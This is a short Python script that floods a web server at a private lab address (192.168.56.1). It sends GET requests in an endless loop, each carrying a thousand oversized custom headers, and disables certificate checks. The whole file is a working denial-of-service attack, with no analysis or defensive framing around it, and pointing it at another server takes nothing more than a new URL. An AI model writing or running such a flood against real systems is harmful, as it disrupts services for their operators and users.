import requests

url = 'https://192.168.56.1'
headers = {f'X-Header-{i}': 'A' * 1000 for i in range(1000)}

while True:
    response = requests.get(url, headers=headers, verify=False)
    print(response.status_code)
